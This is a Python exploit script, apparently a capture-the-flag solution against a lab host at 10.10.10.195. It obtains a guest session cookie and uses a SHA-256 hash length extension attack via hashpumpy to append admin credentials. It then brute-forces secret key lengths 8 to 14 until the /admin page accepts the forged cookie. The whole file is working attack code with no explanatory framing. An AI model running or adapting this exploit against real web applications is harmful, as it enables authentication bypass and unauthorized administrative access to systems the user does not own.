from hashlib import sha256
import os
import requests,string
from base64 import b64decode, b64encode
from random import randrange
from hashpumpy import hashpump
from termcolor import colored
from binascii import unhexlify

Admin_data=";username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"

# proxy set for test
def proxy(proxy):
  if proxy:
    return {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
  else:
    return {} 
#define proxy use    
PROXIES= proxy(False)


def try_admin(Header):
        x = requests.get('http://10.10.10.195/admin', headers=Header)
        return x.status_code

def extract_cookie():
  url="http://10.10.10.195/postlogin"
  payload={"username":"guest","password":"guest"}
  return requests.post(url,allow_redirects=False,verify=False,data=payload,timeout=30,proxies=PROXIES).cookies["auth"]

def parse_cookie(cookie):
  b64_data, b64_sig = cookie.split('.')
  data = b64decode(b64_data)
  sig = b64decode(b64_sig)
  return (data,sig)

prev_msg,prev_sign= parse_cookie(extract_cookie())
Header={}

# we test different key length from 8 to14 like used in source code 
for key_len in range(8,15):
  new_sign,msg= hashpump(prev_sign.hex(),prev_msg.decode(),Admin_data,key_len)
  Header['Cookie']= 'auth='+b64encode(msg).decode()+'.'+b64encode(unhexlify(new_sign)).decode()
  code= try_admin(Header)
  if int(code) == int(200):
      print(colored("Exploit success","green"))
      print("The cookie : "+colored(Header['Cookie'],"green"))
      print("The key lenght was :"+colored(str(key_len),"green"))
      break


